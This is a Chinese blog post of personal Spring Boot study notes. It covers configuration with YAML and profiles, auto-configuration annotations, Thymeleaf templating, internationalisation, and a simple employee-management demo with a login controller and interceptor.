<h1 id="springboot"><a href="#springboot" class="headerlink" title="springboot"></a>springboot</h1><h2 id="创建程序"><a href="#创建程序" class="headerlink" title="创建程序"></a>创建程序</h2><p>首先安装好maven，我修改了maven的repository的位置，所以要在settings.xml中修改，修改完后关键是<code>mvn help system</code>下载<code>repository</code>里的文件（自行上网查吧）</p>
<p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913161000684.png" srcset="/img/loading.gif" lazyload alt="image-20230913161000684"></p>
<p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913160546330.png" srcset="/img/loading.gif" lazyload alt="image-20230913160546330"></p>
<p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913160804466.png" srcset="/img/loading.gif" lazyload alt="image-20230913160804466"></p>
<p>高版本springboot需要java的高版本，我这java8用的是2.2.0（生成后手动改的）</p>
<p>只选择spring web就够了</p>
<p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913161643123.png" srcset="/img/loading.gif" lazyload alt="image-20230913161643123"></p>
<h2 id="算了，不太会讲，就记录知识吧"><a href="#算了，不太会讲，就记录知识吧" class="headerlink" title="算了，不太会讲，就记录知识吧"></a>算了，不太会讲，就记录知识吧</h2><div class="code-wrapper"><pre><code class="hljs less"><span class="hljs-variable">@Configuration</span>    <span class="hljs-comment">//标明这是配置类</span>
<span class="hljs-variable">@Bean</span>     <span class="hljs-comment">//给容器中添加组件</span>
<span class="hljs-variable">@Component</span>   <span class="hljs-comment">//注册</span>
<span class="hljs-variable">@Controller</span>、<span class="hljs-variable">@Service</span>、<span class="hljs-variable">@Repository</span>
<span class="hljs-variable">@ComponentScan</span>、<span class="hljs-variable">@Import</span>
<span class="hljs-variable">@ConditionalOnxxxxx</span>满足Conditional指定的条件，则进行组件注入
<span class="hljs-variable">@ImportResource</span>(<span class="hljs-string">&quot;classpath:beans.xml&quot;</span>)
<span class="hljs-variable">@ConfigurationProperties</span>(prefix=<span class="hljs-string">&quot;&quot;</span>)    <span class="hljs-comment">//能够在配置文件中赋值</span>
<span class="hljs-variable">@AutoConfigurationPackage</span>
<span class="hljs-variable">@Import</span>(AutoConfigurationImportSelector.class)


SpringBoot先加载所有的自动配置类 xxxxxAutoConfiguration

每个自动配置类按照条件进行生效，默认都会绑定配置文件指定的值。xxxxProperties里面拿。xxxProperties和配置文件进行了绑定

生效的配置类就会给容器中装配很多组件</code></pre></div>

<div class="code-wrapper"><pre><code class="hljs dts">设置静态资源访问目录
<span class="hljs-symbol"></span>
<span class="hljs-symbol">spring:</span>
<span class="hljs-symbol">  mvc:</span>
    static-path-pattern: <span class="hljs-keyword">/res/</span>**</code></pre></div>

<p>启动程序主要是这三个东西<code>@SpringBootApplication</code>、<code>SpringApplication</code>和<code>run</code></p>
<p>充当配置文件的<code>application.properties</code>也可以是<code>application.yml</code></p>
<p>在启动程序Application的同级目录下创建controller文件夹，在这写有关路由的东西</p>
<p>@Controller (返回页面)     @RestController(返回内容)</p>
<p>在<code>application.properties</code>中能配置端口<code>server.port=8081</code></p>
<p>自动装配原理</p>
<p>yaml</p>
<div class="code-wrapper"><pre><code class="hljs applescript">大小写敏感
使用缩进表示层级关系
缩进不允许使用<span class="hljs-literal">tab</span>，只允许空格
缩进的空格数不重要，只要同级元素左对齐即可
<span class="hljs-comment">#表示注释</span></code></pre></div>

<div class="code-wrapper"><pre><code class="hljs nestedtext"><span class="hljs-attribute">Person</span><span class="hljs-punctuation">:</span>
  <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">zero$&#123;random.uuid&#125;&#125;</span>
  <span class="hljs-attribute">age</span><span class="hljs-punctuation">:</span> <span class="hljs-string">$&#123;random.int&#125;</span>
  <span class="hljs-attribute">birth</span><span class="hljs-punctuation">:</span> <span class="hljs-string">2018/11/02</span>
  <span class="hljs-attribute">dog</span><span class="hljs-punctuation">:</span>
    <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">wow</span>
    <span class="hljs-attribute">age</span><span class="hljs-punctuation">:</span> <span class="hljs-string">12</span>
<span class="hljs-attribute">server</span><span class="hljs-punctuation">:</span>
  <span class="hljs-attribute">port</span><span class="hljs-punctuation">:</span> <span class="hljs-string">8082</span>

<span class="hljs-attribute">dog</span><span class="hljs-punctuation">:</span>
  <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">pop</span>
  <span class="hljs-attribute">age</span><span class="hljs-punctuation">:</span> <span class="hljs-string">321</span>

<span class="hljs-comment">#Human: [&quot;myname&quot;,&quot;myage&quot;,&quot;nothing&quot;]</span>

<span class="hljs-comment">#Hulman: [&quot;myname&quot;,&quot;youage&quot;,&quot;everything&quot;,[1,2,3]]</span>
<span class="hljs-attribute">Hulman</span><span class="hljs-punctuation">:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">myname</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">youage</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">everything</span>
  <span class="hljs-bullet">-</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">1</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">2</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">3</span>
      
<span class="hljs-comment">#companies: [&#123;id: 1,name: asd&#125;,&#123;id: 2,name: sdf&#125;]</span>
<span class="hljs-attribute">companies</span><span class="hljs-punctuation">:</span>
  <span class="hljs-bullet">-</span>
    <span class="hljs-attribute">id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1</span>
    <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">asd</span>
  <span class="hljs-bullet">-</span>
    <span class="hljs-attribute">id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">2</span>
    <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">sdf</span>

<span class="hljs-attribute">boolean</span><span class="hljs-punctuation">:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">true</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">false</span>
<span class="hljs-attribute">float</span><span class="hljs-punctuation">:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">3.14</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">1.14</span>
<span class="hljs-attribute">int</span><span class="hljs-punctuation">:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">1</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">2</span></code></pre></div>

<h3 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h3><p>使用Spring的<code>@Value</code>注解进行赋值，并且配合<code>@Component</code>注解注册bean</p>
<p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913163225847.png" srcset="/img/loading.gif" lazyload alt="image-20230913163225847"></p>
<p>yaml配置文件赋值</p>
<div class="code-wrapper"><pre><code class="hljs kotlin"><span class="hljs-meta">@ConfigurationProperties(prefix = <span class="hljs-string">&quot;dog&quot;</span>)</span></code></pre></div>

<p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913163400091.png" srcset="/img/loading.gif" lazyload alt="image-20230913163400091"></p>
<div class="code-wrapper"><pre><code class="hljs dts"><span class="hljs-symbol">dog:</span>
<span class="hljs-symbol">  name:</span> pop  
<span class="hljs-symbol">  age:</span> <span class="hljs-number">321</span>
<span class="hljs-meta">#（注意空格）</span></code></pre></div>

<p>properties配置文件</p>
<div class="code-wrapper"><pre><code class="hljs kotlin"><span class="hljs-meta">@PropertySource(<span class="hljs-string">&quot;classpath:user.properties&quot;</span>)</span></code></pre></div>

<h3 id="松散绑定"><a href="#松散绑定" class="headerlink" title="松散绑定"></a>松散绑定</h3><p>yml中写<code>last-name</code> 与<code>lastName</code>是一样的，<code>-</code>后面跟着的字母默认是大写的</p>
<h3 id="JSR303校验"><a href="#JSR303校验" class="headerlink" title="JSR303校验"></a>JSR303校验</h3><div class="code-wrapper"><pre><code class="hljs less"><span class="hljs-variable">@Validated</span>

   <span class="hljs-variable">@Email</span>()
   private String name;</code></pre></div>

<p>一般使用Pattern() 正则匹配</p>
<p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913164032098.png" srcset="/img/loading.gif" lazyload alt="image-20230913164032098"></p>
<p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913164049132.png" srcset="/img/loading.gif" lazyload alt="image-20230913164049132"></p>
<h3 id="多个配置文件位置"><a href="#多个配置文件位置" class="headerlink" title="多个配置文件位置"></a>多个配置文件位置</h3><p>默认选择顺序</p>
<p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913164744829.png" srcset="/img/loading.gif" lazyload alt="image-20230913164744829"></p>
<p>主动选择激活配置   spring.profiles.active&#x3D;</p>
<p>application-名字.properties</p>
<p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913165341467.png" srcset="/img/loading.gif" lazyload alt="image-20230913165341467"></p>
<p>选择application-test.properties的配置</p>
<div class="code-wrapper"><pre><code class="hljs yaml"><span class="hljs-comment">#application.yml</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">profiles:</span>
    <span class="hljs-attr">active:</span> <span class="hljs-string">dev</span>   <span class="hljs-string">//选择执行名字为dev的配置</span>
<span class="hljs-attr">server:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">8081</span>

<span class="hljs-comment">#(---不是为了好看画的、起到分隔的作用)</span>
<span class="hljs-meta">---</span>
<span class="hljs-attr">server:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">8082</span>     
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">profiles:</span> <span class="hljs-string">dev</span>   <span class="hljs-string">//名字</span>
<span class="hljs-meta">---</span>
<span class="hljs-attr">server:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">8083</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">profiles:</span> <span class="hljs-string">test</span></code></pre></div>

<h3 id="自动装配"><a href="#自动装配" class="headerlink" title="自动装配"></a>自动装配</h3><div class="code-wrapper"><pre><code class="hljs less"><span class="hljs-comment">//标注这是一个配置类</span>
<span class="hljs-variable">@Configuration</span>()   
<span class="hljs-variable">@EnableConfigurationProperties</span>()

<span class="hljs-comment">//根据不同的条件来判断当前配置是否生效</span>
<span class="hljs-variable">@ConditionalOnWebApplication</span>()
<span class="hljs-variable">@ConditionalOnClass</span>()
<span class="hljs-variable">@ConditionalOnProperty</span>()

</code></pre></div>

<p>xxxxAutoConfiguration：自动配置类；给容器中添加组件</p>
<p>xxxxProperties:封装配置文件中相关属性</p>
<p>而相关属性我们可以使用配置文件进行修改</p>
<h2 id="web开发"><a href="#web开发" class="headerlink" title="web开发"></a>web开发</h2><p>webjars    </p>
<p>获取静态资源resources下放public、static、resources</p>
<p>优先级 resources &gt; static &gt; public</p>
<p>首页：在三个目录下寻找<code>index.html</code></p>
<p>图标：2.2版本没有，2.1版本放在三个任意一个目录下<code>favicon.ico</code></p>
<p>@Controller    .html文件放在template目录下</p>
<h3 id="thymeleaf-模板"><a href="#thymeleaf-模板" class="headerlink" title="thymeleaf 模板"></a>thymeleaf 模板</h3><div class="code-wrapper"><pre><code class="hljs dust"><span class="language-xml">*</span><span class="hljs-template-variable">&#123;…&#125;</span><span class="language-xml">也可和$</span><span class="hljs-template-variable">&#123;…&#125;</span><span class="language-xml">混用，星号语法对选定对象而不是整个上下文评估表达式，也就是说，只要没有选定的对象，美元($</span><span class="hljs-template-variable">&#123;…&#125;</span><span class="language-xml">)和星号(*</span><span class="hljs-template-variable">&#123;...&#125;</span><span class="language-xml">)的语法就完全一样。</span>
<span class="language-xml"></span>
<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:object</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;user&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span></span>
<span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Name: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;*</span></span></span><span class="hljs-template-variable">&#123;name&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span>赛<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>
<span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Age: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;*</span></span></span><span class="hljs-template-variable">&#123;age&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span>18<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>
<span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Detail: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;*</span></span></span><span class="hljs-template-variable">&#123;detail&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span>好好学习<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>
<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
<span class="language-xml"></span>
<span class="language-xml">//等价于</span>
<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> &gt;</span></span>
<span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Name: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;*</span></span></span><span class="hljs-template-variable">&#123;user.name&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span>赛<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>
<span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Age: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;user.age&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span>18<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>
<span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Detail: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;user.detail&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span>好好学习<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>
<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></code></pre></div>

<p>th:utext&#x3D;”${msg}”         <code>&lt;h1&gt;123&lt;/h1&gt;</code>能够被成功解析</p>
<p>${对象.get方法名}</p>
<p>th:each&#x3D;”user:${users}” th:text&#x3D;”${user}”</p>
<p>MVC配置</p>
<div class="code-wrapper"><pre><code class="hljs aspectj"><span class="hljs-meta">@Configuration</span>

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyMvcConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">WebMvcConfigurer</span> </span>&#123;
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> <span class="hljs-function">ViewResolver <span class="hljs-title">myview</span><span class="hljs-params">()</span></span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> MyViewResolver();
    &#125;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyViewResolver</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ViewResolver</span></span>&#123;
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-function">View <span class="hljs-title">resolveViewName</span><span class="hljs-params">(String viewName, Locale locale)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;
        &#125;
    &#125;
&#125;</code></pre></div>

<h2 id="员工管理系统"><a href="#员工管理系统" class="headerlink" title="员工管理系统"></a>员工管理系统</h2><p>所有页面的静态资源都需要使用thymeleaf接管（）</p>
<p>标上xmlns:th&#x3D;”<a target="_blank" rel="noopener" href="http://www.thymeleaf.org/">http://www.thymeleaf.org</a>“ ，以及修改href和src….等本地链接</p>
<p>th:href    th:src     th:link  @{&#x2F;}</p>
<h3 id="国际化"><a href="#国际化" class="headerlink" title="国际化  #{}"></a>国际化  #{}</h3><p>即页面的中英文转化</p>
<p>先创建<code>login.properties</code>，再创建<code>login_zh_CN.properties</code></p>
<p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230914183413701.png" srcset="/img/loading.gif" lazyload alt="image-20230914183413701"></p>
<p>然后设置信息</p>
<p>设置完后spring.messages.basename&#x3D;i18n.login</p>
<p>然后在html中对应的显示位置     添加 th:xx&#x3D;”#{}” </p>
<div class="code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">th:</span>href=<span class="hljs-string">&quot;@&#123;/index.html(l=zh_CN)&#125;&quot;</span>
<span class="hljs-symbol">th:</span>href=<span class="hljs-string">&quot;@&#123;/index.html(l=en_US)&#125;&quot;</span></code></pre></div>

<div class="code-wrapper"><pre><code class="hljs reasonml">点击按钮转换中英文，设置组件LocaleResolver

public <span class="hljs-keyword">class</span> myLocaleResolver implements LocaleResolver &#123;
    @Override
    public Locale resolve<span class="hljs-constructor">Locale(HttpServletRequest <span class="hljs-params">request</span>)</span> &#123;
        String language = request.get<span class="hljs-constructor">Parameter(<span class="hljs-string">&quot;l&quot;</span>)</span>;
        Locale locale = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Locale</span>.</span></span>get<span class="hljs-constructor">Default()</span>;

        <span class="hljs-keyword">if</span> (!<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">StringUtils</span>.</span></span>is<span class="hljs-constructor">Empty(<span class="hljs-params">language</span>)</span>)&#123;
            <span class="hljs-comment">//zh_CN</span>
            String<span class="hljs-literal">[]</span> s = language.split(<span class="hljs-string">&quot;_&quot;</span>);
            <span class="hljs-comment">//语言，国家</span>
            locale = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Locale(<span class="hljs-params">s</span>[0],<span class="hljs-params">s</span>[1])</span>;
        &#125;
        return locale;
    &#125;

    @Override
    public void set<span class="hljs-constructor">Locale(HttpServletRequest <span class="hljs-params">request</span>, HttpServletResponse <span class="hljs-params">response</span>, Locale <span class="hljs-params">locale</span>)</span> &#123;

    &#125;
&#125;

</code></pre></div>

<p>然后在自定义的myMvcConfig中放入@Bean中</p>
<div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-meta">@Bean</span>
<span class="hljs-keyword">public</span> <span class="hljs-title class_">LocaleResolver</span> <span class="hljs-title function_">localeResolver</span>(<span class="hljs-params"></span>)&#123;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">myLocaleResolver</span>();
&#125;</code></pre></div>

<h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-meta">@Controller</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">loginController</span> &#123;
    <span class="hljs-meta">@RequestMapping</span>(<span class="hljs-string">&quot;/login&quot;</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">login</span>(<span class="hljs-params"><span class="hljs-meta">@RequestParam</span>(<span class="hljs-string">&quot;username&quot;</span>) <span class="hljs-built_in">String</span> username, <span class="hljs-meta">@RequestParam</span>(<span class="hljs-string">&quot;password&quot;</span>) <span class="hljs-built_in">String</span> password, Model model</span>)&#123;
        <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">StringUtils</span>.<span class="hljs-title function_">isEmpty</span>(username) &amp;&amp; <span class="hljs-string">&quot;admin&quot;</span>.<span class="hljs-title function_">equals</span>(password))&#123;
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;index&quot;</span>;
            <span class="hljs-comment">//先在mvc中添加映射，然后跳转</span>
            <span class="hljs-comment">//return &quot;redirect:/main.html&quot;; </span>
        &#125;
        <span class="hljs-keyword">else</span> &#123;
        	<span class="hljs-comment">//提示信息</span>
            model.<span class="hljs-title function_">addAttribute</span>(<span class="hljs-string">&quot;msg&quot;</span>,<span class="hljs-string">&quot;用户名或密码错误&quot;</span>);
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;login&quot;</span>;
        &#125;
    &#125;
&#125;</code></pre></div>

<div class="code-wrapper"><pre><code class="hljs routeros">&lt;p th:<span class="hljs-attribute">text</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;msg&#125;</span>&quot;</span> th:<span class="hljs-attribute">if</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;not #strings.isEmpty(msg)&#125;</span>&quot;</span>&gt;&lt;/p&gt;</code></pre></div>

<h3 id="拦截器"><a href="#拦截器" class="headerlink" title="拦截器"></a>拦截器</h3><div class="code-wrapper"><pre><code class="hljs aspectj"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">loginInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">HandlerInterceptor</span> </span>&#123;
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object <span class="hljs-keyword">handler</span>)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;
    
    	<span class="hljs-comment">//获取session</span>
        Object loginuser = request.getSession().getAttribute(<span class="hljs-string">&quot;loginuser&quot;</span>);
        <span class="hljs-keyword">if</span> (loginuser==<span class="hljs-keyword">null</span>)&#123;
            request.setAttribute(<span class="hljs-string">&quot;msg&quot;</span>,<span class="hljs-string">&quot;请先登录&quot;</span>);
          request.getRequestDispatcher(<span class="hljs-string">&quot;/login.html&quot;</span>).forward(request,response);
          <span class="hljs-comment">//跳转</span>
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
        &#125;<span class="hljs-keyword">else</span> &#123;
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;
        &#125;
    &#125;
&#125;</code></pre></div>

<p>mvc中添加</p>
<div class="code-wrapper"><pre><code class="hljs reasonml">@Override
public void add<span class="hljs-constructor">Interceptors(InterceptorRegistry <span class="hljs-params">registry</span>)</span> &#123;
    registry.add<span class="hljs-constructor">Interceptor(<span class="hljs-params">new</span> <span class="hljs-params">loginInterceptor</span>()</span>).add<span class="hljs-constructor">PathPatterns(<span class="hljs-string">&quot;/**&quot;</span>)</span>.exclude<span class="hljs-constructor">PathPatterns(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;/login.html&quot;</span>,<span class="hljs-string">&quot;/about.html&quot;</span>,<span class="hljs-string">&quot;/contact.html&quot;</span>,<span class="hljs-string">&quot;/js/**&quot;</span>,<span class="hljs-string">&quot;/css/*&quot;</span>,<span class="hljs-string">&quot;/img/*&quot;</span>)</span>;
&#125;</code></pre></div>

<div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-meta">@RequestMapping</span>(<span class="hljs-string">&quot;/login.html&quot;</span>)
<span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">login</span>(<span class="hljs-params"><span class="hljs-meta">@RequestParam</span>(<span class="hljs-string">&quot;username&quot;</span>) <span class="hljs-built_in">String</span> username, <span class="hljs-meta">@RequestParam</span>(<span class="hljs-string">&quot;password&quot;</span>) <span class="hljs-built_in">String</span> password, Model model, HttpSession session</span>)&#123;
    <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">StringUtils</span>.<span class="hljs-title function_">isEmpty</span>(username) &amp;&amp; <span class="hljs-string">&quot;admin&quot;</span>.<span class="hljs-title function_">equals</span>(password))&#123;
        session.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">&quot;loginuser&quot;</span>,username);

        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:index.html&quot;</span>;</code></pre></div>

<h2 id="员工列表"><a href="#员工列表" class="headerlink" title="员工列表"></a>员工列表</h2><p>提取公共页面</p>
<p>把相同的代码添加一个属性   th:fragment&#x3D;”sidebar”</p>
<p>调用  th:replace&#x3D;”~{commons&#x2F;commons::topbar}”    &#x2F;&#x2F;定义属性的位置</p>
<p>高亮</p>
<p> ()传递参数  ~{commons&#x2F;commons::topbar(active&#x3D;”index.html”)}</p>
<p><code>th:xx=&quot;$&#123;active==&#39;index.html&#39;?&#39;nav-link active&#39;:&#39;nav-link&#39;&#125;&quot;</code>    三元运算符判断是否高亮</p>
<p>展示员工界面</p>
<div class="code-wrapper"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">th:each</span>=<span class="hljs-string">&quot;user:$</span></span></span><span class="hljs-template-variable">&#123;users&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span></span>
<span class="language-xml">	<span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;user.getId()&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span>
<span class="language-xml">	<span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;user.getName()&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span>
<span class="language-xml">	<span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;user.getAge()&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span>
<span class="language-xml">	<span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;user.getId()&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span>
<span class="language-xml">	<span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;user.getId()&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span>
<span class="language-xml"></span>
<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span></span></code></pre></div>

<h2 id=""><a href="#" class="headerlink" title=""></a></h2>
                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>java基础和springboot</div>
      <div>https://zer0peach.github.io/2023/09/11/java基础和springboot/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Zer0peach</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年9月11日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/09/12/%E6%B5%85%E7%9C%8BOGNL/" title="浅看OGNL">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">浅看OGNL</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
